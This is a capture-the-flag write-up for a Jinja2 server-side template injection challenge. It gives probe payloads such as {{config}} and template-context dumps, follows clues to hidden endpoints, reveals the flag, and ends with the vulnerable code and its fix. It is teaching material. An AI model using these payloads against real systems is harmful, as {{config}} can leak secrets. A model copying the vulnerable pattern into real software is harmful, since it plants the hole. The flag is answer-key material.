# ECHO//NULL (Web, Medium)

**Author:** Aryan Havkar  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Vulnerability:** Server-Side Template Injection (SSTI) in Jinja2  
**Flag Format:** `OWASP{...}`

---

## Challenge Summary

- **Name:** ECHO//NULL
- **Category:** Web
- **Difficulty:** Medium
- **Vulnerability:** Server-Side Template Injection (SSTI) in Jinja2
- **Flag:** `OWASP{echoes_survive_the_shutdown}`

---

## Challenge Description

> An abandoned archive terminal sits in degraded state ("ARCHIVE NODE 07"). The legacy renderer is active and waiting for external transmissions. Investigate the terminal and recover what survives the shutdown.

---

## Flag

```text
OWASP{echoes_survive_the_shutdown}
```

---

## Exploitation Walkthrough

### 1. Initial Reconnaissance
Navigate to `http://127.0.0.1:5000/`.  
The landing page simulates an abandoned terminal ("ARCHIVE NODE 07") with degraded status.  
The system log indicates:
- `node initialized`
- `archive index mounted`
- `legacy renderer enabled`
- `awaiting transmission`

A form is available to submit messages via `POST /transmit`.

### 2. Message Transmission & Behavior
Submitting a normal payload such as `Hello` returns a response page:
```text
TRANSMISSION ACCEPTED
Hello
```
The application reflects the submitted message inside the terminal viewport.

### 3. Testing Template Expressions
The log entry mentions `legacy renderer enabled`. In Python web stacks (such as Flask), user input reflection often hints at template rendering.

Submit a basic mathematical template expression:
```jinja2
{{7*7}}
```

### 4. SSTI Confirmation
The application responds with:
```text
TRANSMISSION ACCEPTED
49
```
Because `{{7*7}}` is evaluated to `49`, Server-Side Template Injection (SSTI) in the Jinja2 engine is confirmed.

### 5. Investigating Template Context
Instead of attempting destructive remote code execution (RCE), the objective is reconnaissance within the template context. Jinja2 exposes several built-in variables and objects that hold the active evaluation context.

Submit either of the following payloads:
```jinja2
{{self._TemplateReference__context}}
```
or:
```jinja2
{{config}}
```
or:
```jinja2
{{archive_note}}
```

In the resulting output, a custom context variable named `archive_note` is exposed:
```text
archive_note: 'VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz'
```

### 6. Decoding the Base64 Clue
Extract the Base64-encoded string:
```text
VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz
```

Decode it using terminal tools or Python:
```bash
echo "VGhlIG9sZCBub2RlIHN0aWxsIGFjY2VwdHMgL2FyY2hpdmUvc3RhdHVz" | base64 -d
```
Decoded message:
```text
The old node still accepts /archive/status
```

### 7. Accessing the Diagnostic Endpoint
Navigate to the hidden diagnostic endpoint:
```text
http://127.0.0.1:5000/archive/status
```

The terminal renders a restricted diagnostic screen:
```text
========================================
 ARCHIVE NODE 07
 DIAGNOSTIC STATUS
========================================

 INDEX:        INCOMPLETE
 MIRROR:       AVAILABLE
 LEGACY MODE:  ENABLED

 ARCHIVE MIRROR:
 node07://mirror/sector-3

========================================
```

The diagnostic output reveals an archive mirror path: `node07://mirror/sector-3`.

### 8. Accessing the Hidden Archive Mirror
Based on the URI scheme `node07://mirror/sector-3` and the `/archive/status` endpoint structure, access the mirror endpoint passing `sector=3`:
```text
http://127.0.0.1:5000/archive/mirror?sector=3
```

Testing an invalid sector (e.g., `/archive/mirror?sector=1` or `/archive/mirror`) returns:
```text
========================================
 ARCHIVE ERROR
========================================
Sector unavailable.
```

### 9. Flag Recovery
With `?sector=3`, the archive successfully recovers the stored transmission:
```text
========================================
 ARCHIVE RECOVERED
========================================

NODE: 07
SECTOR: 3
RECOVERY STATUS: COMPLETE

MESSAGE:

"To whoever is still listening..."

The shutdown was never complete.

The archive remained active.

FLAG:

OWASP{echoes_survive_the_shutdown}
========================================
```

The retrieved flag is:
```text
OWASP{echoes_survive_the_shutdown}
```

---

## How to Fix the Vulnerability

### Vulnerability Cause
The vulnerability exists because user-controlled input (`user_message`) was dynamically concatenated/interpolated into a Jinja2 template string prior to calling `render_template_string`:
```python
# VULNERABLE PATTERN:
vulnerable_template = template_raw.replace('__MESSAGE_PAYLOAD__', user_message)
return render_template_string(vulnerable_template, archive_note=ARCHIVE_NOTE)
```
This forces Jinja2 to treat arbitrary user input as executable template syntax rather than plain data.

### Remediation
1. **Never pass user-controlled input directly into `render_template_string` or template compilers.**
2. **Use static template files with variable passing and auto-escaping enabled:**
```python
# SECURE IMPLEMENTATION:
return render_template('transmission.html', message=user_message)
```
Inside `transmission.html`:
```html
<div class="payload-display">{{ message }}</div>
```
With auto-escaping enabled, Jinja2 treats `{{ message }}` strictly as data, escaping HTML and preventing expression evaluation (`{{7*7}}` remains literally `{{7*7}}`).
